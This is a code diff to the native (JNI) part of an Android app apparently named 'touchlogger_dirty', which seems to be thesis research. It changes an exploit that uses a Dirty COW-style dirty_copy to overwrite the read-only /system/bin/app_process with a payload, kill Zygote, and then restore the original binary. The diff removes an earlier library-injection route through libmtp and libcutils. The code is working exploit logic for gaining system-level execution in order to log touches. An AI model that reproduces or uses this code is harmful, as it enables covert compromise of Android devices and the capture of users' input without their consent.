@@ -2,9 +2,9 @@
 #include <string>
 #include <stdlib.h>
 #include <unistd.h>
+#include <sys/stat.h>
 
 #include "dirty/file_utils/file_utils.h"
-#include "dirty/lib_utils/inject.h"
 #include "dirty/file_utils/dirty_copy.h"
 #include "dirty/common/logging.h"
 
@@ -14,18 +14,17 @@
 #define APP_PROCESS_PATH "/system/bin/app_process32"
 #endif
 
-#define LIBCUTILS_PATH "/system/lib/libcutils.so"
-#define LIBMTP_PATH "/system/lib/libmtp.so"
+#define APP_PROCESS_FALLBACK_PATH "/system/bin/app_process"
+
 #define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/exec_payload"
 
 // TODO: make this depend on build type
 #define DEBUG 1
 
 char app_process_backup_path[PATH_MAX];
-char libcutils_backup_path[PATH_MAX];
-char libmtp_backup_path[PATH_MAX];
-char shared_payload_path[PATH_MAX];
 char exec_payload_path[PATH_MAX];
+char payload_path[PATH_MAX];
+char app_process_remote_path[PATH_MAX];
 
 extern "C"
 JNIEXPORT jboolean JNICALL
@@ -35,29 +34,19 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_prepare(JNIEnv* env, jcla
   const char* localPath = env->GetStringUTFChars(localPath_, 0);
 
   snprintf(app_process_backup_path, PATH_MAX, "%s/%s", localPath, "app_process.bak");
-  snprintf(libcutils_backup_path, PATH_MAX, "%s/%s", localPath, "libcutils.so.bak");
-  snprintf(libmtp_backup_path, PATH_MAX, "%s/%s", localPath, "libmtp.so.bak");
-  snprintf(shared_payload_path, PATH_MAX, "%s/%s", localPath, "libshared_payload.so");
   snprintf(exec_payload_path, PATH_MAX, "%s/%s", localPath, "exec_payload");
+  snprintf(payload_path, PATH_MAX, "%s/%s", localPath, "payload");
 
-  LOGV("Backup libmtp...");
-  if (copy_file_with_mode(LIBMTP_PATH, libmtp_backup_path, 0777) == -1)
+  struct stat st;
+  if (stat(APP_PROCESS_PATH, &st) == 0)
   {
-    LOGV("Failed!");
-    return (jboolean) false;
+    snprintf(app_process_remote_path, PATH_MAX, "%s", APP_PROCESS_PATH);
+  } else {
+    snprintf(app_process_remote_path, PATH_MAX, "%s", APP_PROCESS_FALLBACK_PATH);
   }
-  LOGV("Done!");
-
-  LOGV("Backup libcutils...");
-  if (copy_file_with_mode(LIBCUTILS_PATH, libcutils_backup_path, 0777) == -1)
-  {
-    LOGV("Failed!");
-    return (jboolean) false;
-  }
-  LOGV("Done!");
 
   LOGV("Backup app_process...");
-  if (copy_file_with_mode(APP_PROCESS_PATH, app_process_backup_path, 0777) == -1)
+  if (copy_file_with_mode(app_process_remote_path, app_process_backup_path, 0777) == -1)
   {
     LOGV("Failed!");
     return (jboolean) false;
@@ -69,29 +58,6 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_prepare(JNIEnv* env, jcla
   {
     LOGV("Failed!");
     return (jboolean) false;
-  }
-  LOGV("Done!");
-
-  LOGV("Replace libmtp...");
-  if (dirty_copy(shared_payload_path, LIBMTP_PATH) == -1)
-  {
-    LOGV("Failed!");
-    return (jboolean) false;
-  }
-  LOGV("Done!")
-
-  LOGV("Inject dependency into libcutils...")
-  if (inject_dependency_into_library(LIBCUTILS_PATH, "libmtp.so") == -1)
-  {
-    LOGV("Failed!");
-    LOGV("Temporary fix for test device...");
-    LOGV("Please report if you see this in production version!");
-    // FIXME: Temp fix for my Nexus 5, remove before production code!
-    if (replace_dependency_in_binary(LIBCUTILS_PATH, "libcutils.so", "libmtp.so") == -1)
-    {
-      LOGV("Failed!");
-      return (jboolean) false;
-    }
   }
   LOGV("Done!");
 
@@ -118,10 +84,9 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerLogger(JNIEnv* env
     int killer_pid;
     if ((killer_pid = fork()) == 0)
     {
-      if (dirty_copy(shared_payload_path, APP_PROCESS_PATH) == -1)
+      if (dirty_copy(payload_path, app_process_remote_path) == -1)
       {
-        LOGV("Unable to overwrite app_process (%s) with %s!", APP_PROCESS_PATH,
-             shared_payload_path);
+        LOGV("Unable to overwrite app_process (%s) with %s!", app_process_remote_path, payload_path);
         exit(-1);
       }
       else
@@ -135,7 +100,7 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerLogger(JNIEnv* env
     //FIXME: come up with something less dumb than that
     sleep(10);
 
-    LOGV("Zygote is probably dead now");
+    LOGV("Zygote is probably overwritten now");
 
     if (kill(killer_pid, SIGKILL) == -1)
     {
@@ -146,7 +111,7 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerLogger(JNIEnv* env
       LOGV("Killer process killed successfully!");
     }
 
-    if (dirty_copy(app_process_backup_path, APP_PROCESS_PATH) == -1)
+    if (dirty_copy(app_process_backup_path, app_process_remote_path) == -1)
     {
       LOGV("Unable to restore app_process from backup! Reboot yor device and try again.");
       exit(-1);
@@ -156,31 +121,7 @@ Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerLogger(JNIEnv* env
       LOGV("Zygote successfully restarted!");
     }
 
-    sleep(10);
-
-    LOGV("Return everything to initial state");
-
-    if (!(killer_pid = fork()))
-    {
-      dirty_copy(shared_payload_path, APP_PROCESS_PATH);
-      exit(0);
-    }
-    else
-    {
-      sleep(5);
-    }
-
-    LOGV("Wait for it...");
-    sleep(5);
-
-    kill(killer_pid, SIGKILL);
-    LOGV("Done! About to resurrect it");
-
-    dirty_copy(libmtp_backup_path, LIBMTP_PATH);
-    dirty_copy(libcutils_backup_path, LIBCUTILS_PATH);
-    dirty_copy(app_process_backup_path, APP_PROCESS_PATH);
     LOGV("Done!");
-
     exit(0);
   }
 }
